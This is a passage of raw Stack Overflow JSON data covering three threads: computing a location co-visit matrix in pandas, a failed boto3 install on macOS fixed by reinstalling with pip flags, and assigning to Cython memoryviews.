you&#39;re defining this graph. Why are the edges between locations, rather than between customers and locations? Why does location B have a weight-2 edge to A when location C doesn&#39;t?"}, {"owner": {"reputation": 916, "user_id": 4608333, "user_type": "registered", "accept_rate": 59, "profile_image": "https://www.gravatar.com/avatar/8452dfe3fe013a2f97cb23379c47b730?s=128&d=identicon&r=PG&f=1", "display_name": "kurious", "link": "https://stackoverflow.com/users/4608333/kurious"}, "edited": false, "score": 0, "creation_date": 1463006437, "post_id": 37174081, "comment_id": 61883538, "body": "I think I made  a mistake in the previous matrix. I have corrected it now. Hope it makes more sense."}, {"owner": {"reputation": 576, "user_id": 5504459, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/5433245ceb1d5feb805dbcbd9f462bc5?s=128&d=identicon&r=PG&f=1", "display_name": "mark s.", "link": "https://stackoverflow.com/users/5504459/mark-s"}, "edited": false, "score": 0, "creation_date": 1463006778, "post_id": 37174081, "comment_id": 61883639, "body": "Ok, I think I understand what you&#39;re trying to do. For each customer, you&#39;re essentially creating a connected graph. What you&#39;re asking for is a sum of the adjacency matrices that represent these graphs. What&#39;s not clear is how &#39;A&#39;, &#39;B&#39;, and &#39;C&#39; are connected. For example, customer &#39;alpha&#39;, location &#39;A&#39; and &#39;C&#39; are not connected. Is this due to the order they appear in your data? We need to know how each location is connected to create the appropriate adjacency matrix."}, {"owner": {"reputation": 16763, "user_id": 2749397, "user_type": "registered", "accept_rate": 78, "profile_image": "https://i.stack.imgur.com/rcNMz.png?s=128&g=1", "display_name": "gboffi", "link": "https://stackoverflow.com/users/2749397/gboffi"}, "edited": false, "score": 0, "creation_date": 1463007082, "post_id": 37174081, "comment_id": 61883728, "body": "Nodes of the graph are <code>Location</code>s, every <code>Location</code> is connected to all other ones, the weight of an edge (possibly zero) is the number of <code>Customer</code>s that have visited both places. Kurious, is this interpretation correct?"}, {"owner": {"reputation": 916, "user_id": 4608333, "user_type": "registered", "accept_rate": 59, "profile_image": "https://www.gravatar.com/avatar/8452dfe3fe013a2f97cb23379c47b730?s=128&d=identicon&r=PG&f=1", "display_name": "kurious", "link": "https://stackoverflow.com/users/4608333/kurious"}, "edited": false, "score": 0, "creation_date": 1463007189, "post_id": 37174081, "comment_id": 61883760, "body": "In my case, connection between two locations is a common customer who visited them both. For nodes &#39;A&#39; and &#39;B&#39;, the edge is the count of number of their common customers. This count is 2 because both &#39;Alpha&#39; and &#39;Beta&#39; visited them. For &#39;A&#39; and &#39;C&#39;, the count is 1 because only &#39;Alpha&#39; visited both of them."}, {"owner": {"reputation": 916, "user_id": 4608333, "user_type": "registered", "accept_rate": 59, "profile_image": "https://www.gravatar.com/avatar/8452dfe3fe013a2f97cb23379c47b730?s=128&d=identicon&r=PG&f=1", "display_name": "kurious", "link": "https://stackoverflow.com/users/4608333/kurious"}, "edited": false, "score": 0, "creation_date": 1463007346, "post_id": 37174081, "comment_id": 61883810, "body": "Yes gboffi, you are right"}], "answers": [{"comments": [{"owner": {"reputation": 916, "user_id": 4608333, "user_type": "registered", "accept_rate": 59, "profile_image": "https://www.gravatar.com/avatar/8452dfe3fe013a2f97cb23379c47b730?s=128&d=identicon&r=PG&f=1", "display_name": "kurious", "link": "https://stackoverflow.com/users/4608333/kurious"}, "edited": false, "score": 0, "creation_date": 1463021974, "post_id": 37174996, "comment_id": 61887473, "body": "This is very helpful and comprehensive, thank you. On a side note, can you please give me some tips to think maturely about such problems. I&#39;ve been programming in Python for close to 2 years now (self-learning). I didn&#39;t know about using <code>Counter</code> or <code>product</code>.  I was messing around with multiple loops.  How do I develop the kind of proficiency that you have demonstrated?"}, {"owner": {"reputation": 9372, "user_id": 4585963, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/8Yzwc.jpg?s=128&g=1", "display_name": "hilberts_drinking_problem", "link": "https://stackoverflow.com/users/4585963/hilberts-drinking-problem"}, "reply_to_user": {"reputation": 916, "user_id": 4608333, "user_type": "registered", "accept_rate": 59, "profile_image": "https://www.gravatar.com/avatar/8452dfe3fe013a2f97cb23379c47b730?s=128&d=identicon&r=PG&f=1", "display_name": "kurious", "link": "https://stackoverflow.com/users/4608333/kurious"}, "edited": false, "score": 1, "creation_date": 1463023425, "post_id": 37174996, "comment_id": 61887839, "body": "Now this is a question... I am certainly far from thinking maturely in general, but here are some resources that I&#39;ve found helpful: <a href=\"https://projecteuler.net/\" rel=\"nofollow noreferrer\">projecteuler.net</a> <a href=\"https://www.hackerrank.com/\" rel=\"nofollow noreferrer\">hackerrank.com</a> <a href=\"http://www.scipy-lectures.org/advanced/advanced_python/\" rel=\"nofollow noreferrer\">scipy-lectures.org/advanced/advanced_python</a> <a href=\"http://sopython.com/canon/\" rel=\"nofollow noreferrer\">sopython.com/canon</a> stackoverflow is obviously great; I like to think that I learn a lot from answering questions like this one."}, {"owner": {"reputation": 916, "user_id": 4608333, "user_type": "registered", "accept_rate": 59, "profile_image": "https://www.gravatar.com/avatar/8452dfe3fe013a2f97cb23379c47b730?s=128&d=identicon&r=PG&f=1", "display_name": "kurious", "link": "https://stackoverflow.com/users/4608333/kurious"}, "edited": false, "score": 0, "creation_date": 1463071069, "post_id": 37174996, "comment_id": 61918123, "body": "There seems to be some issue with the code. I want the matrix to have a 0 if there are no common customers between two locations (like between C-D in the example matrix). However, the present code inputs the count of the customers going to the &#39;row&#39; location instead."}, {"owner": {"reputation": 9372, "user_id": 4585963, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/8Yzwc.jpg?s=128&g=1", "display_name": "hilberts_drinking_problem", "link": "https://stackoverflow.com/users/4585963/hilberts-drinking-problem"}, "reply_to_user": {"reputation": 916, "user_id": 4608333, "user_type": "registered", "accept_rate": 59, "profile_image": "https://www.gravatar.com/avatar/8452dfe3fe013a2f97cb23379c47b730?s=128&d=identicon&r=PG&f=1", "display_name": "kurious", "link": "https://stackoverflow.com/users/4608333/kurious"}, "edited": false, "score": 0, "creation_date": 1463073393, "post_id": 37174996, "comment_id": 61919434, "body": "Perhaps share an example? I found a bug that could have caused it. Apparently, counter ordering behaved differently from what I thought, so I replaced it with an explicit comprehension."}, {"owner": {"reputation": 916, "user_id": 4608333, "user_type": "registered", "accept_rate": 59, "profile_image": "https://www.gravatar.com/avatar/8452dfe3fe013a2f97cb23379c47b730?s=128&d=identicon&r=PG&f=1", "display_name": "kurious", "link": "https://stackoverflow.com/users/4608333/kurious"}, "edited": false, "score": 0, "creation_date": 1463074509, "post_id": 37174996, "comment_id": 61920087, "body": "I updated the example in the question. Is there additional information I can provide?"}, {"owner": {"reputation": 9372, "user_id": 4585963, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/8Yzwc.jpg?s=128&g=1", "display_name": "hilberts_drinking_problem", "link": "https://stackoverflow.com/users/4585963/hilberts-drinking-problem"}, "reply_to_user": {"reputation": 916, "user_id": 4608333, "user_type": "registered", "accept_rate": 59, "profile_image": "https://www.gravatar.com/avatar/8452dfe3fe013a2f97cb23379c47b730?s=128&d=identicon&r=PG&f=1", "display_name": "kurious", "link": "https://stackoverflow.com/users/4608333/kurious"}, "edited": false, "score": 0, "creation_date": 1463075083, "post_id": 37174996, "comment_id": 61920442, "body": "I can reproduce the updated matrix with this version of the code. Let me know if it still has unexpected behavior."}, {"owner": {"reputation": 916, "user_id": 4608333, "user_type": "registered", "accept_rate": 59, "profile_image": "https://www.gravatar.com/avatar/8452dfe3fe013a2f97cb23379c47b730?s=128&d=identicon&r=PG&f=1", "display_name": "kurious", "link": "https://stackoverflow.com/users/4608333/kurious"}, "edited": false, "score": 0, "creation_date": 1463413025, "post_id": 37174996, "comment_id": 62042434, "body": "Follow up question at <a href=\"http://stackoverflow.com/questions/37257733/creating-a-matrix-from-pandas-dataframe-to-display-connectedness-2\" title=\"creating a matrix from pandas dataframe to display connectedness 2\">stackoverflow.com/questions/37257733/&hellip;</a>"}], "tags": [], "owner": {"reputation": 9372, "user_id": 4585963, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/8Yzwc.jpg?s=128&g=1", "display_name": "hilberts_drinking_problem", "link": "https://stackoverflow.com/users/4585963/hilberts-drinking-problem"}, "is_accepted": true, "score": 1, "last_activity_date": 1463073316, "last_edit_date": 1463073316, "creation_date": 1463010195, "answer_id": 37174996, "question_id": 37174081, "link": "https://stackoverflow.com/questions/37174081/creating-a-matrix-from-pandas-dataframe-to-display-connectedness/37174996#37174996", "title": "Creating a matrix from Pandas dataframe to display connectedness", "body": "<p>Here is one approach that takes into account the multiplicity of visits (e.g. if Customer X visits both LocA and LocB twice, he will contribute <code>2</code> to the corresponding position in the final matrix).</p>\n\n<p>Idea:</p>\n\n<ol>\n<li>For each location, count visits by customer.</li>\n<li>For each location pair, find the sum of minimal numbers of visits for each customer who visited both.</li>\n<li>Use <code>unstack</code> and cleanup.</li>\n</ol>\n\n<p><code>Counter</code> plays nicely here because counters support many natural arithmetic operations, like <code>add</code>, <code>max</code> etc.</p>\n\n<pre><code>import pandas as pd\nfrom collections import Counter\nfrom itertools import product\n\ndf = pd.DataFrame({\n    'Customer_ID': ['Alpha', 'Alpha', 'Alpha', 'Beta', 'Beta'],\n    'Location_ID': ['A', 'B', 'C', 'A', 'B'],\n    })\n\n\nctrs = {location: Counter(gp.Customer_ID) for location, gp in df.groupby('Location_ID')}\n\n\n# In [7]: q.ctrs\n# Out[7]:\n# {'A': Counter({'Alpha': 1, 'Beta': 1}),\n#  'B': Counter({'Alpha': 1, 'Beta': 1}),\n#  'C': Counter({'Alpha': 1})}\n\n\nctrs = list(ctrs.items())\noverlaps = [(loc1, loc2, sum(min(ctr1[k], ctr2[k]) for k in ctr1))\n    for i, (loc1, ctr1) in enumerate(ctrs, start=1)\n    for (loc2, ctr2) in ctrs[i:] if loc1 != loc2]\noverlaps += [(l2, l1, c) for l1, l2, c in overlaps]\n\n\ndf2 = pd.DataFrame(overlaps, columns=['Loc1', 'Loc2', 'Count'])\ndf2 = df2.set_index(['Loc1', 'Loc2'])\ndf2 = df2.unstack().fillna(0).astype(int)\n\n\n#      Count\n# Loc2     A  B  C\n# Loc1\n# A        0  2  1\n# B        2  0  1\n# C        1  1  0\n</code></pre>\n\n<p>If you like to disregard multiplicities, replace <code>Counter(gp.Customer_ID)</code> with <code>Counter(set(gp.Customer_ID))</code>.</p>\n"}, {"comments": [{"owner": {"reputation": 916, "user_id": 4608333, "user_type": "registered", "accept_rate": 59, "profile_image": "https://www.gravatar.com/avatar/8452dfe3fe013a2f97cb23379c47b730?s=128&d=identicon&r=PG&f=1", "display_name": "kurious", "link": "https://stackoverflow.com/users/4608333/kurious"}, "edited": false, "score": 0, "creation_date": 1463072686, "post_id": 37175370, "comment_id": 61919029, "body": "I get this error:  <code>TypeError: &#39;DataFrame&#39; objects are mutable, thus they cannot be hashed</code> for <code>matrix = [[0 for col in range(matrix_size)] for row in range(matrix_size)]</code>"}, {"owner": {"reputation": 576, "user_id": 5504459, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/5433245ceb1d5feb805dbcbd9f462bc5?s=128&d=identicon&r=PG&f=1", "display_name": "mark s.", "link": "https://stackoverflow.com/users/5504459/mark-s"}, "reply_to_user": {"reputation": 916, "user_id": 4608333, "user_type": "registered", "accept_rate": 59, "profile_image": "https://www.gravatar.com/avatar/8452dfe3fe013a2f97cb23379c47b730?s=128&d=identicon&r=PG&f=1", "display_name": "kurious", "link": "https://stackoverflow.com/users/4608333/kurious"}, "edited": false, "score": 0, "creation_date": 1463079800, "post_id": 37175370, "comment_id": 61923199, "body": "I removed the unnecessary <code>set()</code> from the line <code>matrix_size = len(set(df.groupby(&#39;Location&#39;)))</code>. It works as expected now."}], "tags": [], "owner": {"reputation": 576, "user_id": 5504459, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/5433245ceb1d5feb805dbcbd9f462bc5?s=128&d=identicon&r=PG&f=1", "display_name": "mark s.", "link": "https://stackoverflow.com/users/5504459/mark-s"}, "is_accepted": false, "score": 1, "last_activity_date": 1463079743, "last_edit_date": 1463079743, "creation_date": 1463013090, "answer_id": 37175370, "question_id": 37174081, "link": "https://stackoverflow.com/questions/37174081/creating-a-matrix-from-pandas-dataframe-to-display-connectedness/37175370#37175370", "title": "Creating a matrix from Pandas dataframe to display connectedness", "body": "<p>I'm sure there's a more elegant way but here's a solution I came up with on the fly. Basically you build an adjacency list for each customer, then update the adjacency matrix accordingly:</p>\n\n<pre><code>import pandas as pd\n\n#I'm assuming you can get your data into a pandas data frame:\ndata = {'Customer_ID':[1,1,1,2,2],'Location':['A','B','C','A','B']}\ndf = pd.DataFrame(data)\n\n#Initialize an empty matrix\nmatrix_size = len(df.groupby('Location'))\nmatrix = [[0 for col in range(matrix_size)] for row in range(matrix_size)]\n\n#To make life easier, I made a map to go from locations \n#to row/col positions in the matrix\nlocation_set = list(set(df['Location'].tolist()))\nlocation_set.sort()\nlocation_map = dict(zip(location_set,range(len(location_set))))\n\n#Group data by customer, and create an adjacency list (dyct) for each\n#Update the matrix accordingly\nfor name,group in df.groupby('Customer_ID'):\n    locations = set(group['Location'].tolist())\n    dyct = {}\n    for i in locations:\n        dyct[i] = list(locations.difference(i))\n\n    #Loop through the adjacency list and update matrix\n    for node, edges in dyct.items(): \n        for edge in edges:\n            matrix[location_map[edge]][location_map[node]] +=1\n</code></pre>\n"}], "owner": {"reputation": 916, "user_id": 4608333, "user_type": "registered", "accept_rate": 59, "profile_image": "https://www.gravatar.com/avatar/8452dfe3fe013a2f97cb23379c47b730?s=128&d=identicon&r=PG&f=1", "display_name": "kurious", "link": "https://stackoverflow.com/users/4608333/kurious"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 1088, "favorite_count": 0, "accepted_answer_id": 37174996, "answer_count": 2, "score": 0, "last_activity_date": 1463079743, "creation_date": 1463004462, "last_edit_date": 1463071301, "question_id": 37174081, "link": "https://stackoverflow.com/questions/37174081/creating-a-matrix-from-pandas-dataframe-to-display-connectedness", "title": "Creating a matrix from Pandas dataframe to display connectedness", "body": "<p>I have my data in this format in a pandas dataframe:</p>\n\n<pre><code>Customer_ID  Location_ID\nAlpha             A\nAlpha             B\nAlpha             C\nBeta              A\nBeta              B\nBeta              D\n</code></pre>\n\n<p>I want to study the mobility patterns of the customers. My goal is to determine the clusters of locations that are most frequented by customers. I think the following matrix can provide such information:</p>\n\n<pre><code>   A  B  C  D\nA  0  2  1  1\nB  2  0  1  1\nC  1  1  0  0\nD  1  1  0  0\n</code></pre>\n\n<p>How do I do so in Python?</p>\n\n<p>My dataset is quite large (hundreds of thousands of customers and about a hundred locations).</p>\n"}, {"tags": ["python", "macos", "boto3"], "comments": [{"owner": {"reputation": 2320, "user_id": 4117496, "user_type": "registered", "accept_rate": 89, "profile_image": "https://i.stack.imgur.com/UT3ly.jpg?s=128&g=1", "display_name": "Fisher Coder", "link": "https://stackoverflow.com/users/4117496/fisher-coder"}, "reply_to_user": {"reputation": 31205, "user_id": 2482744, "user_type": "registered", "accept_rate": 52, "profile_image": "https://i.stack.imgur.com/OQPNY.png?s=128&g=1", "display_name": "Alex Hall", "link": "https://stackoverflow.com/users/2482744/alex-hall"}, "edited": false, "score": 0, "creation_date": 1463004793, "post_id": 37174080, "comment_id": 61882957, "body": "for sure I tried sudo, but no luck. and it&#39;s the exactly same error."}, {"owner": {"reputation": 2320, "user_id": 4117496, "user_type": "registered", "accept_rate": 89, "profile_image": "https://i.stack.imgur.com/UT3ly.jpg?s=128&g=1", "display_name": "Fisher Coder", "link": "https://stackoverflow.com/users/4117496/fisher-coder"}, "reply_to_user": {"reputation": 31205, "user_id": 2482744, "user_type": "registered", "accept_rate": 52, "profile_image": "https://i.stack.imgur.com/OQPNY.png?s=128&g=1", "display_name": "Alex Hall", "link": "https://stackoverflow.com/users/2482744/alex-hall"}, "edited": false, "score": 4, "creation_date": 1463005326, "post_id": 37174080, "comment_id": 61883144, "body": "sudo pip install boto3 --ignore-installed six did work. Thanks."}], "owner": {"reputation": 2320, "user_id": 4117496, "user_type": "registered", "accept_rate": 89, "profile_image": "https://i.stack.imgur.com/UT3ly.jpg?s=128&g=1", "display_name": "Fisher Coder", "link": "https://stackoverflow.com/users/4117496/fisher-coder"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 4213, "favorite_count": 0, "closed_date": 1463005836, "answer_count": 0, "score": 1, "last_activity_date": 1463006648, "creation_date": 1463004459, "last_edit_date": 1463006648, "question_id": 37174080, "link": "https://stackoverflow.com/questions/37174080/unable-to-install-boto3-on-mac", "closed_reason": "Duplicate", "title": "Unable to install boto3 on Mac", "body": "<p>I'm trying to install boto3 on my Mac(10.11.4), but was not able to; here's the error.</p>\n\n<p>I've tried to installed the latest pip, but still now working.</p>\n\n<pre><code>pip install boto3\nCollecting boto3\n  Using cached boto3-1.3.1-py2.py3-none-any.whl\nRequirement already satisfied (use --upgrade to upgrade): futures&lt;4.0.0,&gt;=2.2.0 in /Library/Python/2.7/site-packages (from boto3)\nRequirement already satisfied (use --upgrade to upgrade): jmespath&lt;1.0.0,&gt;=0.7.1 in /Library/Python/2.7/site-packages (from boto3)\nCollecting botocore&lt;1.5.0,&gt;=1.4.1 (from boto3)\n  Using cached botocore-1.4.18-py2.py3-none-any.whl\nCollecting python-dateutil&lt;3.0.0,&gt;=2.1 (from botocore&lt;1.5.0,&gt;=1.4.1-&gt;boto3)\n  Using cached python_dateutil-2.5.3-py2.py3-none-any.whl\nCollecting docutils&gt;=0.10 (from botocore&lt;1.5.0,&gt;=1.4.1-&gt;boto3)\n  Using cached docutils-0.12.tar.gz\nCollecting six&gt;=1.5 (from python-dateutil&lt;3.0.0,&gt;=2.1-&gt;botocore&lt;1.5.0,&gt;=1.4.1-&gt;boto3)\n  Using cached six-1.10.0-py2.py3-none-any.whl\nInstalling collected packages: six, python-dateutil, docutils, botocore, boto3\n  Found existing installation: six 1.4.1\n    DEPRECATION: Uninstalling a distutils installed project (six) has been deprecated and will be removed in a future version. This is due to the fact that uninstalling a distutils project will only partially uninstall the project.\n    Uninstalling six-1.4.1:\nException:\nTraceback (most recent call last):\n  File \"/Library/Python/2.7/site-packages/pip-7.1.2-py2.7.egg/pip/basecommand.py\", line 211, in main\n    status = self.run(options, args)\n  File \"/Library/Python/2.7/site-packages/pip-7.1.2-py2.7.egg/pip/commands/install.py\", line 311, in run\n    root=options.root_path,\n  File \"/Library/Python/2.7/site-packages/pip-7.1.2-py2.7.egg/pip/req/req_set.py\", line 640, in install\n    requirement.uninstall(auto_confirm=True)\n  File \"/Library/Python/2.7/site-packages/pip-7.1.2-py2.7.egg/pip/req/req_install.py\", line 716, in uninstall\n    paths_to_remove.remove(auto_confirm)\n  File \"/Library/Python/2.7/site-packages/pip-7.1.2-py2.7.egg/pip/req/req_uninstall.py\", line 125, in remove\n    renames(path, new_path)\n  File \"/Library/Python/2.7/site-packages/pip-7.1.2-py2.7.egg/pip/utils/__init__.py\", line 315, in renames\n    shutil.move(old, new)\n  File \"/System/Library/Frameworks/Python.framework/Versions/2.7/lib/python2.7/shutil.py\", line 302, in move\n    copy2(src, real_dst)\n  File \"/System/Library/Frameworks/Python.framework/Versions/2.7/lib/python2.7/shutil.py\", line 131, in copy2\n    copystat(src, dst)\n  File \"/System/Library/Frameworks/Python.framework/Versions/2.7/lib/python2.7/shutil.py\", line 103, in copystat\n    os.chflags(dst, st.st_flags)\nOSError: [Errno 1] Operation not permitted: '/var/folders/2s/n6x417ts45g4bhqcl4bccz_8b6mvmh/T/pip-Er44rb-uninstall/System/Library/Frameworks/Python.framework/Versions/2.7/Extras/lib/python/six-1.4.1-py2.7.egg-info'\nYou are using pip version 7.1.2, however version 8.1.2 is available.\nYou should consider upgrading via the 'pip install --upgrade pip' command.\n</code></pre>\n"}, {"tags": ["python", "numpy", "neural-network", "cython", "conv-neural-network"], "comments": [{"owner": {"reputation": 23048, "user_id": 4657412, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/4915a27d01efa79d81d322511ee517a9?s=128&d=identicon&r=PG&f=1", "display_name": "DavidW", "link": "https://stackoverflow.com/users/4657412/davidw"}, "edited": false, "score": 1, "creation_date": 1463033844, "post_id": 37174074, "comment_id": 61891232, "body": "One option to avoid this would be not to type the class attributes (e.g <code>cdef object y</code>). That way they can be of any type. You might lose a small amount of speed but you could get some of it back by assigning to a typed local variable before use."}, {"owner": {"reputation": 23048, "user_id": 4657412, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/4915a27d01efa79d81d322511ee517a9?s=128&d=identicon&r=PG&f=1", "display_name": "DavidW", "link": "https://stackoverflow.com/users/4657412/davidw"}, "edited": false, "score": 1, "creation_date": 1463033936, "post_id": 37174074, "comment_id": 61891266, "body": "But if you wanted to keep them as memoryviews, I think you just need to change your assignment syntax to match the number of dimensions: <code>self.y[:,:,:,:] = ...</code>"}, {"owner": {"reputation": 18483, "user_id": 497600, "user_type": "registered", "accept_rate": 81, "profile_image": "https://www.gravatar.com/avatar/9d2bd51b0d7a3e483cb42919119d2e8d?s=128&d=identicon&r=PG", "display_name": "lhk", "link": "https://stackoverflow.com/users/497600/lhk"}, "reply_to_user": {"reputation": 23048, "user_id": 4657412, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/4915a27d01efa79d81d322511ee517a9?s=128&d=identicon&r=PG&f=1", "display_name": "DavidW", "link": "https://stackoverflow.com/users/4657412/davidw"}, "edited": false, "score": 0, "creation_date": 1463041182, "post_id": 37174074, "comment_id": 61895647, "body": "The assignments have the correct number of dimensions. It&#39;s always either 4 dim (batch_size, features, width, height) or 2 dim (filter_size**2 * features, batch_size<i>width</i>height)"}, {"owner": {"reputation": 18483, "user_id": 497600, "user_type": "registered", "accept_rate": 81, "profile_image": "https://www.gravatar.com/avatar/9d2bd51b0d7a3e483cb42919119d2e8d?s=128&d=identicon&r=PG", "display_name": "lhk", "link": "https://stackoverflow.com/users/497600/lhk"}, "reply_to_user": {"reputation": 23048, "user_id": 4657412, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/4915a27d01efa79d81d322511ee517a9?s=128&d=identicon&r=PG&f=1", "display_name": "DavidW", "link": "https://stackoverflow.com/users/4657412/davidw"}, "edited": false, "score": 0, "creation_date": 1463041234, "post_id": 37174074, "comment_id": 61895688, "body": "If the dimensions are wrong, there is a runtime error, too. but it says explicitly that the dimensions don&#39;t match. I had that error too ..."}, {"owner": {"reputation": 18483, "user_id": 497600, "user_type": "registered", "accept_rate": 81, "profile_image": "https://www.gravatar.com/avatar/9d2bd51b0d7a3e483cb42919119d2e8d?s=128&d=identicon&r=PG", "display_name": "lhk", "link": "https://stackoverflow.com/users/497600/lhk"}, "reply_to_user": {"reputation": 23048, "user_id": 4657412, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/4915a27d01efa79d81d322511ee517a9?s=128&d=identicon&r=PG&f=1", "display_name": "DavidW", "link": "https://stackoverflow.com/users/4657412/davidw"}, "edited": false, "score": 0, "creation_date": 1463042796, "post_id": 37174074, "comment_id": 61896740, "body": "Oh, sorry I misunderstood what you said. I thought you meant declarations. I&#39;ll try to update the assignment"}, {"owner": {"reputation": 18483, "user_id": 497600, "user_type": "registered", "accept_rate": 81, "profile_image": "https://www.gravatar.com/avatar/9d2bd51b0d7a3e483cb42919119d2e8d?s=128&d=identicon&r=PG", "display_name": "lhk", "link": "https://stackoverflow.com/users/497600/lhk"}, "reply_to_user": {"reputation": 23048, "user_id": 4657412, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/4915a27d01efa79d81d322511ee517a9?s=128&d=identicon&r=PG&f=1", "display_name": "DavidW", "link": "https://stackoverflow.com/users/4657412/davidw"}, "edited": false, "score": 0, "creation_date": 1463042856, "post_id": 37174074, "comment_id": 61896781, "body": "Interesting idea, since at other places, I&#39;ve used  [:,:,:,:]. Sometimes there is slicing involved and I wanted to emphasize that in those cases, there is no slicing. Assignments with [:,:,:,:] didn&#39;t fail. Can&#39;t wait to try that out"}, {"owner": {"reputation": 23048, "user_id": 4657412, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/4915a27d01efa79d81d322511ee517a9?s=128&d=identicon&r=PG&f=1", "display_name": "DavidW", "link": "https://stackoverflow.com/users/4657412/davidw"}, "edited": false, "score": 0, "creation_date": 1463045918, "post_id": 37174074, "comment_id": 61899138, "body": "Not sure I got it quite right - ndarray to memoryview slicing assignment doesn&#39;t seem to work. See answer..."}], "answers": [{"comments": [{"owner": {"reputation": 18483, "user_id": 497600, "user_type": "registered", "accept_rate": 81, "profile_image": "https://www.gravatar.com/avatar/9d2bd51b0d7a3e483cb42919119d2e8d?s=128&d=identicon&r=PG", "display_name": "lhk", "link": "https://stackoverflow.com/users/497600/lhk"}, "edited": false, "score": 0, "creation_date": 1463054268, "post_id": 37182991, "comment_id": 61905061, "body": "That&#39;s strange. I would have expected this intermediate step to be exactly the same as the assignment to self.y . After all self.y is a memoryview of 4 dimensions. And temporaryview is a memoryview of 4 dimensions. Why does one assignment fail and the other work ? It seems like the problem is just moved somewhere else.  Thanks for the tip, I&#39;ll try that as soon as I get home."}, {"owner": {"reputation": 18483, "user_id": 497600, "user_type": "registered", "accept_rate": 81, "profile_image": "https://www.gravatar.com/avatar/9d2bd51b0d7a3e483cb42919119d2e8d?s=128&d=identicon&r=PG", "display_name": "lhk", "link": "https://stackoverflow.com/users/497600/lhk"}, "edited": false, "score": 0, "creation_date": 1463089493, "post_id": 37182991, "comment_id": 61928274, "body": "As expected: The code now fails at the assignment to temporary_view_of_transpose. Same error message &quot;TypeError: only length 1 arrays can be converted to python scalars&quot;. Does that work for you ? I&#39;m using python 3.5 with the anaconda distribution and cython 0.24"}, {"owner": {"reputation": 23048, "user_id": 4657412, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/4915a27d01efa79d81d322511ee517a9?s=128&d=identicon&r=PG&f=1", "display_name": "DavidW", "link": "https://stackoverflow.com/users/4657412/davidw"}, "reply_to_user": {"reputation": 18483, "user_id": 497600, "user_type": "registered", "accept_rate": 81, "profile_image": "https://www.gravatar.com/avatar/9d2bd51b0d7a3e483cb42919119d2e8d?s=128&d=identicon&r=PG", "display_name": "lhk", "link": "https://stackoverflow.com/users/497600/lhk"}, "edited": false, "score": 0, "creation_date": 1463120436, "post_id": 37182991, "comment_id": 61936995, "body": "Yes - using the final block of code works as written (Cython 0.24). I&#39;ve edited it slightly to make it slightly clearer what&#39;s happening. You&#39;ve got to be clear on the difference between <code>mview = something</code> (<code>mview</code> is now set to look at the memory held by something) vs <code>mview[...] = something</code> (the data in the memory looked at by <code>something</code> is copied into the memory looked at by <code>mview</code>, and they both have to be memoryviews)"}, {"owner": {"reputation": 18483, "user_id": 497600, "user_type": "registered", "accept_rate": 81, "profile_image": "https://www.gravatar.com/avatar/9d2bd51b0d7a3e483cb42919119d2e8d?s=128&d=identicon&r=PG", "display_name": "lhk", "link": "https://stackoverflow.com/users/497600/lhk"}, "edited": false, "score": 0, "creation_date": 1463126581, "post_id": 37182991, "comment_id": 61940569, "body": "Doesn&#39;t work for me. I&#39;ve updated the question with the exact code that fails."}, {"owner": {"reputation": 23048, "user_id": 4657412, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/4915a27d01efa79d81d322511ee517a9?s=128&d=identicon&r=PG&f=1", "display_name": "DavidW", "link": "https://stackoverflow.com/users/4657412/davidw"}, "reply_to_user": {"reputation": 18483, "user_id": 497600, "user_type": "registered", "accept_rate": 81, "profile_image": "https://www.gravatar.com/avatar/9d2bd51b0d7a3e483cb42919119d2e8d?s=128&d=identicon&r=PG", "display_name": "lhk", "link": "https://stackoverflow.com/users/497600/lhk"}, "edited": false, "score": 0, "creation_date": 1463167809, "post_id": 37182991, "comment_id": 61966974, "body": "I&#39;ve added a complete working example which I think covers a simplified version of what you&#39;re trying to do. At this case I don&#39;t know what isn&#39;t working for you."}, {"owner": {"reputation": 18483, "user_id": 497600, "user_type": "registered", "accept_rate": 81, "profile_image": "https://www.gravatar.com/avatar/9d2bd51b0d7a3e483cb42919119d2e8d?s=128&d=identicon&r=PG", "display_name": "lhk", "link": "https://stackoverflow.com/users/497600/lhk"}, "edited": false, "score": 0, "creation_date": 1463229070, "post_id": 37182991, "comment_id": 61983259, "body": "Thank you very much, it works now. I&#39;m at a loss, why it didn&#39;t the first time I tried. My guess is that I messed up the re-compilation. That would be embarrassing. Unfortunately this solution creates a new error. In the forward pass in my network I have to transpose outcols to get y. In the backward pass, it&#39;s exactly inverted. And memoryviews don&#39;t seem to have a transpose method (only .T) . And I can&#39;t cast the memoryview to ndarray.... Well, I&#39;ve accepted your answer, since it is the perfect answer to my question."}, {"owner": {"reputation": 18483, "user_id": 497600, "user_type": "registered", "accept_rate": 81, "profile_image": "https://www.gravatar.com/avatar/9d2bd51b0d7a3e483cb42919119d2e8d?s=128&d=identicon&r=PG", "display_name": "lhk", "link": "https://stackoverflow.com/users/497600/lhk"}, "edited": false, "score": 0, "creation_date": 1463229888, "post_id": 37182991, "comment_id": 61983493, "body": "I&#39;ve created a question for the new problem. You seem to be an expert on cython, would you care to take a look: <a href=\"http://stackoverflow.com/questions/37226813/cython-transpose-a-memoryview\" title=\"cython transpose a memoryview\">stackoverflow.com/questions/37226813/&hellip;</a>"}], "tags": [], "owner": {"reputation": 23048, "user_id": 4657412, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/4915a27d01efa79d81d322511ee517a9?s=128&d=identicon&r=PG&f=1", "display_name": "DavidW", "link": "https://stackoverflow.com/users/4657412/davidw"}, "is_accepted": true, "score": 1, "last_activity_date": 1463167625, "last_edit_date": 